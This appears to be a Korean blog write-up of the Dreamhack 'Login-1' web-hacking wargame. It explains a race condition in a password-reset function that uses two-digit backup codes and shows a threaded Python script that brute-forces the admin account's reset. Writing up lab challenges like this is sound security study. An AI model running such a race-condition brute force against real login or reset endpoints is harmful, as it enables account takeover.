---
title:  "[Dreamhack] Login-1 풀이"
excerpt: "Dreamhack Login-1 풀이"

categories:
  - Dreamhack
tags:
  - [Dreamhack, wargame, WebHacking]

toc: true
toc_sticky: true
 
date: 2022-04-06
last_modified_at: 2022-04-06
---
## 문제 정보
<div class="notice--primary" markdown="1">
python으로 작성된 로그인 기능을 가진 서비스입니다.

“admin” 권한을 가진 사용자로 로그인하여 플래그를 획득하세요.
</div>


## 문제 힌트
<div class="notice--primary" markdown="1">
BackupCode<br>
Race Condition Attack
</div>

## 문제 풀이
<div class="notice--primary" markdown="1">

#### `메인 페이지`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/main.png)

#### `로그인`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/login.png)

#### `회원가입`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/register.png)

#### `비밀번호 찾기`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/forget_password.png)
특이하게 비밀번호를 찾을 때 BackupCode를 사용한다.

#### `회원가입 완료`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/register_backupcode.png)
회원가입에 성공하면 BackupCode가 생성된다.

#### `BackupCode 함수`
{: .text-right }
```python
def makeBackupcode():
    return random.randrange(100)
```
문제 파일을 다운로드 받아 해당 코드를 살펴보면
makeBackupcode 함수가 있는데, randrange함수를 통해 100까지의 값을 랜덤으로 리턴해준다.

#### `로그인 후`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/test_login.png)
로그인을 시도하면 계정 정보가 출력된다.<br>
현재 test계정으로 로그인을 한 결과 Level이 guest이다.

#### `계정 정보`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/user_info.png)
로그인 후 상단에 출력되는 계정 정보를 클릭하면 `/user/17` 경로의 상세보기 페이지로 넘어간다.<br>
상세보기에서는 UserID, UserName, UserLevel이 출력된다.<br>
UserLevel이 0이라면 guest, UserLevel이 1이라면 admin으로 추측된다.

#### `Admin 계정 정보`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/Apple_info.png)
`/user/1` 경로에 접속해보니 Admin 계정으로 추측되는 Apple 계정이 출력되었다.<br>
해당 방법으로 1~16의 값을 입력해보니 Apple 이외에도 7개의 Admin 계정을 더 확인할 수 있다.<br>

#### `관리자 계정 탈취`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/Apple_reset_password.png)
Apple Admin 계정을 탈취하기 위해 BackupCode에 100까지의 아무 값을 입력했다.

#### `관리자 계정 탈취2`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/reset_password_fail.png)<br>
계정의 비밀번호 찾기 기회는 총 5번으로 확인되었다.
막무가내로 아무 값을 넣었다간 계정이 잠긴다.



#### `비밀번호 찾기 코드 확인`
{: .text-right }
```python
if user:
# security for brute force Attack.
time.sleep(1)
if user['resetCount'] == MAXRESETCOUNT:
    return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
        
    if user['backupCode'] == backupCode:
        newbackupCode = makeBackupcode()
        updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
        cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
        msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

    else:
        updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
        cur.execute(updateSQL, (str(user['idx'])))
        msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
    conn.commit()
    return render_template("index.html", msg=msg)

return "<script>alert('User Not Found.');history.back(-1);</script>";

```
1. `if user:`<br>
user 입력값이 유효하다면 `time.sleep(1)`를 통해 1초를 지연시킨다.

2. `user['resetCount'] == MAXRESETCOUNT:`<br>
MAXRESETCOUNT값은 위의 과정에서 5인것을 확인했다.<br>
resetCount값이 5라면 비밀번호 찾기에 제한이 생긴다.

3. `if user['backupCode'] == backupCode:`<br>
BackupCode가 일치하면 makeBackupcode 함수를 호출해서 1~100까지 랜덤한 숫자의 백업코드를 만들고 패스워드를 변경한다.

4. `else:`<br>
BackupCode가 일치하지 않으면 resetcount를 1 증가시킨다.

코드를 분석한 결과 1초 내에 요청이 여러번 들어오면 레이스 컨디션 취약점이 발생하게 된다.<br>
Burp Suite를 사용해서 문제를 취약점을 발생시키려고 했으나, <br>
Burp Suite Community Edition 버전은 Intruder 기능을 사용할때 속도 제한이 걸려있다..<br>
Professional 버전은 속도 제한이 없지만 지금은 Professional 버전이 없기떄문에<br>
구글링을 통해 Python Script Attack을 시도했다.

#### `Attack`
{: .text-right }
```python
import threading, requests

url = "http://host1.dreamhack.games:19488/forgot_password"

def forgot(backupCode):
    data = {"userid": "Apple", "newpassword": "1234", "backupCode": backupCode}
    requests.post(url, data=data)
    print(f"Backupcode: {backupCode}")

if __name__ == "__main__":
    threads = []
    print("Attack Start")

    for i in range(1, 100 + 1):
        t = threading.Thread(target=forgot, args=[i])
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    print("Attack Finish")
    print("New Password: 1234")
```
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/attack_result.png)<br>
공격이 끝났기 때문에 Apple 계정의 패스워드는 1234로 변경되었을것이다.

#### `끝`
{: .text-right }
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/Apple_login_success.png)<br>
![ex_screenshot](/assets/images/2022-04-06-Dreamhack-login-1/flag.png)<br>
Apple/1234 계정의 접속에 성공해서 Flag를 얻었다.


</div>



 
